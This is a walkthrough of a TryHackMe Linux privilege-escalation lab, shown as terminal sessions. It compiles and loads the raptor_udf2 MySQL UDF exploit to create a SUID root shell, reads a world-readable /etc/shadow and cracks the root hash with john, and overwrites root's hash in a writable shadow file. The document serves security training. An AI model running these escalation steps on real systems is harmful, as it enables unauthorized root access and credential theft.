# Room
https://tryhackme.com/room/linuxprivesc

# Task 1 - Deploy VM and connect with SSH
SSH to the server and then check group associations using the id command
* id
    ```
    user@debian:~$ id
    uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)    
    ```

# Task 2 - Service Exploits
When the MySQL service runs as root, there may be an exploit you can take advantage of that uses User Defined Functions.
* cd to the udf directory and compile the exploit code
    ```
    user@debian:~$ cd /home/user/tools/mysql-udf/
    user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
    user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    user@debian:~/tools/mysql-udf$ ls -lrta raptor*
    -rw-r--r-- 1 user user 3378 May 15  2020 raptor_udf2.c
    -rw-r--r-- 1 user user 5344 Jan 26 18:38 raptor_udf2.o
    -rwxr-xr-x 1 user user 8272 Jan 26 18:39 raptor_udf2.so

    https://www.exploit-db.com/exploits/1518
    ```
* connect to MySQL as the root user and create a User Defined Function
    ```
    user@debian:~/tools/mysql-udf$ mysql -u root
    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 35
    Server version: 5.1.73-1+deb6u1 (Debian)

    Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    mysql> use mysql;
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    mysql> create table foo(line blob);
    Query OK, 0 rows affected (0.00 sec)

    mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
    Query OK, 1 row affected (0.00 sec)

    mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
    Query OK, 1 row affected (0.00 sec)

    mysql> create function do_system returns integer soname 'raptor_udf2.so';
    Query OK, 0 rows affected (0.00 sec)

    mysql> 
    ```
* use the function you just created to copy /bin/bash to a temp file and then give that file the SUID permission, finally jump into the shell and verify you are root
    ```
    mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
    +------------------------------------------------------------------+
    | do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
    +------------------------------------------------------------------+
    |                                                                0 |
    +------------------------------------------------------------------+
    1 row in set (0.01 sec)

    mysql> exit
    Bye
    user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
    rootbash-4.1# whoami
    root
    rootbash-4.1# 
    ```
* remove the file when you are finished
    ```
    mysql> select do_system('rm -rf /tmp/rootbash');
    +-----------------------------------+
    | do_system('rm -rf /tmp/rootbash') |
    +-----------------------------------+
    |                                 0 |
    +-----------------------------------+
    1 row in set (0.00 sec)

    mysql> exit
    Bye
    user@debian:/tmp$ ls -lrta /tmp/rootbash
    ls: cannot access /tmp/rootbash: No such file or directory
    ```
# Task 3 - Weak File Permissions - Readable /etc/shadow
/etc/shadow has password hashes, it is only readable by root
* check the /etc/shadow file to see if it is misconfigured and allows you to read it
    ```
    user@debian:~$ ls -lrta /etc/shadow
    -rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow

    user@debian:~$ cat /etc/shadow
    root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
    daemon:*:17298:0:99999:7:::
    bin:*:17298:0:99999:7:::
    sys:*:17298:0:99999:7:::
    sync:*:17298:0:99999:7:::
    games:*:17298:0:99999:7:::
    man:*:17298:0:99999:7:::
    lp:*:17298:0:99999:7:::
    mail:*:17298:0:99999:7:::
    news:*:17298:0:99999:7:::
    uucp:*:17298:0:99999:7:::
    proxy:*:17298:0:99999:7:::
    www-data:*:17298:0:99999:7:::
    backup:*:17298:0:99999:7:::
    list:*:17298:0:99999:7:::
    irc:*:17298:0:99999:7:::
    gnats:*:17298:0:99999:7:::
    nobody:*:17298:0:99999:7:::
    libuuid:!:17298:0:99999:7:::
    Debian-exim:!:17298:0:99999:7:::
    sshd:*:17298:0:99999:7:::
    user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
    statd:*:17299:0:99999:7:::
    mysql:!:18133:0:99999:7:::
    ```
* crack root's hash with john
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt h1.txt                           

    Using default input encoding: UTF-8                                                                                                                                             
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])                                                                                                     
    Cost 1 (iteration count) is 5000 for all loaded hashes                                                                                                                          
    Will run 2 OpenMP threads                                                                                                                                                       
    Press 'q' or Ctrl-C to abort, almost any other key for status
    [removed]      (?)
    1g 0:00:00:01 DONE (2021-01-26 18:49) 0.7692g/s 1083p/s 1083c/s 1083C/s cuties..tagged
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```
# Task 4 - Weak File Permissions - Writable /etc/shadow
If the /etc/shadow file is writeable, you can create a new password hash with a password of your choosing, and overwrite an existing one
* Generate a new password
    ```
    user@debian:~$ mkpasswd -m sha-512 cool
    $6$SrDC5MGFC.3uMi$MW1nLHduoLKd1C85/5n0a85rZwKhcTQivbI.4/D.lSBZToHNjOFEmS0cVKnq54MOVrTj4/LEilbr2ACMJMAl60
    ```
* Edit the /etc/shadow file and replace root's password hash with the one you just created
    ```
    user@debian:~$ vim /etc/shadow
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#     
    ```